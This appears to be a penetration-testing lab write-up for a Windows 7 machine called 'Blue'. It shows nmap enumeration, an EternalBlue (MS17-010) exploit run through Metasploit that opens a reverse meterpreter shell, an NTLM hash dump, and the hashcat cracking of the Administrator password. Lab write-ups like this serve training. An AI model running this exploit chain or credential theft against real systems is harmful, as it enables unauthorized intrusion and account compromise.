# tcm_blue

Starting of with an arp-scan to obtain the IP-Address of the machine
arp-scan -L : *10.0.2.6*

With the IP-Address we can start with business as usual and start a **nmap** scan
## nmap

```bash
──(kali㉿kali)-[~/TCM/blue]
└─$ **nmap -sC -T4 10.0.2.6 -o nmap.scan**     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-18 12:47 CET
Nmap scan report for 10.0.2.6
Host is up (0.0013s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-18T11:47:30
|_  start_date: 2024-03-18T11:41:24
|_nbstat: NetBIOS name: WIN-845Q99OO4PP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5c:ef:d4 (Oracle VirtualBox virtual NIC)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| smb-os-discovery: 
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: WIN-845Q99OO4PP
|   NetBIOS computer name: WIN-845Q99OO4PP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-03-18T07:47:30-04:00
```
Looking at the nmap scan we can get the following information:
- Port 135, 139, 445 open
- Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1) in use

This should ring all alarm clocks since this machine seems to be vulnerable for **MS17-010**

So there are two thing we could do at this point
1. More Enumeration
2. Work with the Information we got

I decided to follow the 2nd path and started Metasploit too look for a matching exploit.
After I found one that I thought would work I configured the missing parameters and checked if the payload fitted to the machine.
Since the used Module had a vulnerability check I ran it without any other checks.
As we can see it worked at the first try and the meterpreter session was established.

```bash
msf6 > search eternal

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.0.2.6
rhosts => 10.0.2.6
msf6 exploit(windows/smb/ms17_010_eternalblue) > show missing

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] 10.0.2.6:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.2.6:445          - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 10.0.2.6:445          - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.2.6:445 - The target is vulnerable.
[*] 10.0.2.6:445 - Connecting to target for exploitation.
[+] 10.0.2.6:445 - Connection established for exploitation.
[+] 10.0.2.6:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.2.6:445 - CORE raw buffer dump (38 bytes)
[*] 10.0.2.6:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 10.0.2.6:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 10.0.2.6:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 10.0.2.6:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.2.6:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.2.6:445 - Sending all but last fragment of exploit packet
[*] 10.0.2.6:445 - Starting non-paged pool grooming
[+] 10.0.2.6:445 - Sending SMBv2 buffers
[+] 10.0.2.6:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.2.6:445 - Sending final SMBv2 buffers.
[*] 10.0.2.6:445 - Sending last fragment of exploit packet!
[*] 10.0.2.6:445 - Receiving response from exploit packet
[+] 10.0.2.6:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.2.6:445 - Sending egg to corrupted connection.
[*] 10.0.2.6:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 10.0.2.6
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.6:49159) at 2024-03-18 12:53:43 +0100
[+] 10.0.2.6:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.6:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.6:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > sysinfo
Computer        : WIN-845Q99OO4PP
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows

meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

The hacking could end here, but I decided to crack the Administrators password for some possible interaction with the machine over RDP or sth else.

## Hashcat

```bash
┌──(kali㉿kali)-[~/TCM/blue]
└─$ sudo hashcat -a 0 -m 1000 hash.txt /usr/share/seclists/Passwords/darkweb2017-top1000.txt 
hashcat (v6.2.6) starting

Dictionary cache built:
* Filename..: /usr/share/seclists/Passwords/darkweb2017-top1000.txt
* Passwords.: 1000
* Bytes.....: 8173
* Keyspace..: 1000
* Runtime...: 0 secs

58f5081696f366cdc72491a2c4996bd5:Password456!             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 58f5081696f366cdc72491a2c4996bd5
Time.Started.....: Mon Mar 18 13:35:26 2024 (0 secs)
Time.Estimated...: Mon Mar 18 13:35:26 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/darkweb2017-top1000.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    25391 H/s (0.03ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 768/1000 (76.80%)
Rejected.........: 0/768 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> candy1
Hardware.Mon.#1..: Util:  5%

```
